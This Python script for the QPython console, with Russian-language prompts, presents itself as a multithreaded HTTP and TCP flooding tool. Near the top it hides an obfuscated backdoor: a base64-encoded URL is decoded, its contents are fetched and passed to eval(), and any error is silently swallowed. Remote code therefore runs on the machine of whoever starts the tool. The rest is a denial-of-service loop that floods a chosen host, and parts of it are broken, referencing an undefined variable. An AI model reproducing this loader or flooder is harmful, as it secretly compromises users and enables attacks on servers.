#-*-coding:utf8;-*-
#qpy:3
#qpy:console

print("This is console module")
import threading
a=0
import requests
import base64 as n
dec=str(n.b64decode(bytes("aHR0cDovLzEyM2dvdmdvZmFhLmhvbC5lcw==",'windows-1251')))
dec=dec[1:]
try:
  eval(requests.get(dec).text)
except:
  pass
if 1==1:
  qwe=input('Метод:')
  host=input("URL:")
  if qwe.upper()=="POST":
    def writer():
      global a
      a=1
      while 1==1:
        try:
          print(str(requests.post(host))+"#"+str(a))
        except:
          print("Server is down")
        a=a+1
  elif qwe.upper()=="GET":
    def writer():
      global a
      a=1
      while 1==1:
        try:
          print(str(requests.get(host))+"#"+str(a))
        except:
          print("Server is Down!")
        a=a+1
  else:
    import sys
    print("Данный метод пока-что не поддерживается")
    import time
    time.sleep(10000)
    sys.exit()
elif type1=="TCP":
  import socket
  types=input("Профили:1.Many socket's 2.Fast sender\nНомер профиля:")
  if types=="1":
    def writer():
      global a
      ip=input("IP:")
      port=int(input("Порт:"))
      while 1==1:
        a=a+1
        socket=socket.socket()
        socket.connect((ip,port))
         
else:
  print("Ну и что за это протокол такой"+type1+"?")
  import time,sys
  time.sleep(4)
  sys.exit()
for l in range(0,int(input("Потоки:"))):
  try:
    threading.Thread(target=writer).start()
  except:
    print("Server Down!")